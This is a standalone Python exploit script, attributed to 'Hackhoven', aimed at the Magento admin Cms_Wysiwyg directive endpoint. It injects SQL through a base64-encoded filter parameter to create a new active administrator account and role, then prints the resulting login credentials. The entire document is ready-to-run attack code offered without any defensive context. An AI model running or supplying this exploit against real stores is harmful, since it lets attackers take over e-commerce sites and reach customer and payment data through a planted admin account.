#!/usr/bin/env python3

# Developed by Hackhoven

import requests
import base64
import sys

def exploit(target_url, username, password):
    if not target_url.startswith("http"):
        target_url = "http://" + target_url

    if target_url.endswith("/"):
        target_url = target_url[:-1]

    target_url += "/index.php/admin/Cms_Wysiwyg/directive/index/"

    query_template = """
    SET @SALT = 'rp';
    SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
    SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
    INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
    INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
    """

    query = query_template.replace("\n", "").format(username=username, password=password)
    pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query).encode()

    r = requests.post(target_url,
                      data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
                            "filter": base64.b64encode(pfilter),
                            "forwarded": 1})

    if r.ok:
        print("Exploit Successful")
        print(f"Login URL: {target_url}/admin with credentials {username}:{password}")
    else:
        print("Exploit Failed")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 exploit.py <target_url> <username> <password>")
        sys.exit(1)

    target_url = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]

    exploit(target_url, username, password)
